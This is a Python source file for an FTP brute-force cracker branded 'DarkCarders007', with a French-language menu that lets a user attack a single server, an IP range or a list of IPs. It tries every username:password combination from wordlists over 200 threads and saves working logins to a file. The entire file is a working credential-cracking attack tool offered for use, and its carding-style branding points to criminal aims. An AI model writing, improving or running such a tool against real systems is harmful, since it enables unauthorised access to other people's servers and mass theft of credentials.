
# -*- coding: utf-8 -*-
#! /usr/bin/python3

import sys, os, time
import ipaddress
import ftplib
from queue import Queue
import threading
import pyfiglet
from colorama import init
init(strip=not sys.stdout.isatty())
from termcolor import cprint
from pyfiglet import figlet_format
from clint.textui import colored

qftp = Queue()
qftpuser = Queue()
qftppass = Queue()

setipacrack = []
setuser = []
setpass = []
setips = []
settotalcombo =[]

def banniere() :
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')
    text="DarkCarders007"
    cprint(figlet_format(text, font="standard"), "green")
    print(colored.blue("DarkTools : FTP_CRACKER"))
    print(colored.red("-- Version 1.0 --"))
    print(colored.yellow("Realease: 26/08/2021"))
    print(colored.magenta("FTP Cracker Brute Forcer By DarkCarders007 "))
    print(colored.cyan('https://t.me/DarkCarders007'))
    print(colored.green('https://github.com/DarkCarders007'))
    print(colored.red('https://www.youtube.com/channel/UC7kyGeHDb9YwY-3YjEksEqw'))

def menubase():
   print()
   print(colored.green("0. Exit() "))
   print(colored.green("1. Crack Sur 1 Seule IP  "))
   print(colored.green("2. Crack Sur Ip's Range "))
   print(colored.green("3. Crack Fichier D'Ip's "))

   while True:
        try:    
            menubaseoption = int(input("On Crack Quoi ? "))
            if menubaseoption == 1:
                crackipsolo()
            elif menubaseoption == 2:
                crackiprange()
            elif menubaseoption == 3:
                crackipfile()
            elif menubaseoption == 0:
                print(colored.magenta("Merci D'Avoir Utilisé Le Tools !"))
                quit()
            else :
                print(colored.red("Invalide Option"))
        except ValueError:      ## Si pas un chiffre ou "entree"
            print(colored.red("Je Ne Vois Cette Option Nulle Part ?!"))

def threadallow():
    print(colored.yellow("\n"+"Crack En Cours...."))
    for x in range(200):   
        t = threading.Thread(target=CrackFTP)
        t.daemon = True
        t.start()
        start = time.time()
    qftp.join()
    totaltime =  time.time()- start
    print(colored.yellow("Terminé En " + str(totaltime)+" !!"))
    print(colored.yellow("FTP Ok Enregistrer Dans: validftp.txt"))
    menubase()

def CrackFTP():
    while not qftp.empty():
        ftpserv = qftp.get()
        qftpuser.queue.clear()
        for lignecomboatester in sorted(settotalcombo):
            qftpuser.put(lignecomboatester)
        while not qftpuser.empty():
            combos = qftpuser.get()
            username, password = combos.split(":",1)
            try :
                ftp = ftplib.FTP(ftpserv, timeout= 2)
                ftp.login(username, password)
                print(colored.blue("\n"+'Sucess ! '+ftpserv+":"+username+":"+password))
                ftpok = ftpserv+":"+username+":"+password
                open('validftp.txt', 'a').write(ftpok + "\n")
                break
            except ftplib.error_perm as exc:
                print(colored.red(ftpserv+' Login Fail ', exe))
            except TimeoutError :
                print(colored.blue('Timeout ! Pas de Reponse Du Serveur '+ftpserv+"\n"))
                break
            except ConnectionRefusedError:
                print(colored.red("Connection Refusé "+ftpserv))
                break
            except OSError:
                break
        qftp.task_done()

def crackipsolo():
    while True:
        server = input("\n"+"FTP Server Adresse: ")
        user = input("Identifiant: ")
        passwordlist = input("Chemin (Path) Vers La Liste De PASS .txt> ")
        try :
            with open(passwordlist, 'r', encoding='utf-8', errors='ignore') as pwds :
                for pwd in pwds:
                    pwd = pwd.strip('\r\n')
                    try :
                        ftp = ftplib.FTP(server)
                        ftp.login(user, pwd)
                        print(colored.blue("\n"+'Sucess ! Le Pass est: '+ pwd))
                        break
                    except ftplib.error_perm as exc:
                        print('Login Fail ', exe)
                    except TimeoutError :
                        print(colored.blue('Timeout ! Pas de Reponse Du Serveur...'))
        except Exception as exc :
            print('Wordlist Error', exc)
        menubase()

def crackiprange():
     while True :
        ipacrackfrom = input("\n"+"From IP: ")
        ipacrackto = input("To IP: ")
        try:
            start_ip = ipaddress.IPv4Address(ipacrackfrom)
            end_ip = ipaddress.IPv4Address(ipacrackto)
            for ip_int in range(int(start_ip), int(end_ip)):
                qftp.put(str(ipaddress.IPv4Address(ip_int)))
        except :
            print(input(colored.red("Ce N'Est Pas Une Plage D'Ip's Valide !!")))
            break
        userlist = input("Chemin (Path) Vers La Liste De USER .txt> ")
        try :
            with open(userlist, 'r', encoding='utf-8', errors='ignore') as users :
                for user in users:
                    user = user.strip('\r\n')
                    setuser.append(user)
        except Exception as exc :
            print('Word_List Error', exc)
        passwordlist = input("Chemin (Path) Vers La Liste De PASS .txt> ")
        try :
            with open(passwordlist, 'r', encoding='utf-8', errors='ignore') as pwds :
                for pwd in pwds:
                    pwd = pwd.strip('\r\n')
                    setpass.append(pwd)
        except Exception as exc :
                print('Pass_List Error', exc)
        for users in sorted(setuser):
            for pwds in sorted(setpass):
                total = users+":"+pwds
                settotalcombo.append(total)
        threadallow()
        break

def crackipfile():
    while True :
        iplist = input("Chemin (Path) Vers La Liste D'IP's .txt> ")
        try :
            with open(iplist, 'r', encoding='utf-8', errors='ignore') as ipss :
                for ips in ipss:
                    ips = ips.strip('\r\n')
                    qftp.put(ips)
        except Exception as exc :
            print('IP_List Error', exc)
        userlist = input("Chemin (Path) Vers La Liste De USER .txt> ")
        try :
            with open(userlist, 'r', encoding='utf-8', errors='ignore') as users :
                for user in users:
                    user = user.strip('\r\n')
                    setuser.append(user)
        except Exception as exc :
            print('Word_List Error', exc)
        passwordlist = input("Chemin (Path) Vers La Liste De PASS .txt> ")
        try :
            with open(passwordlist, 'r', encoding='utf-8', errors='ignore') as pwds :
                for pwd in pwds:
                    pwd = pwd.strip('\r\n')
                    setpass.append(pwd)
        except Exception as exc :
            print('Pass_List Error', exc)
        for users in sorted(setuser):
            for pwds in sorted(setpass):
                total = users+":"+pwds
                settotalcombo.append(total)
        threadallow()
        break
        
banniere()
menubase()
